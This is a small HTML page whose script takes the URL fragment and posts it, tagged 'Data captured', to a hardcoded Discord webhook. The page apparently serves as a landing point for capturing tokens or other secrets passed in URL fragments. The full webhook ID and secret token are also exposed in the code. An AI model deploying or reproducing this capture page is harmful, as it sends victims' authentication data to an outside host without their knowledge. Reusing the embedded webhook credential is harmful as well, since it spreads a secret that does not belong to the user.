<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send URL Data to Webhook</title>
</head>
<body>
<script>
(function() {
  const dataToSend = window.location.hash ? window.location.hash.substring(1) : null;

  if (dataToSend) {
    const webhookUrl = "https://discord.com/api/webhooks/1303524286707011674/xC5koezC0nmTgXhq7OROOrq4R4XLb0hgSN35cAZFuHbNP5JZvCOVmJs81eDgk5sStkNo";
    const payload = {
      content: `Data captured: ${dataToSend}`
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).then(() => {
      console.log("Data sent successfully!");
    }).catch(error => {
      console.error("Error sending data:", error);
    });
  } else {
    console.log("No data found in URL.");
  }
})();
</script>
</body>
</html>
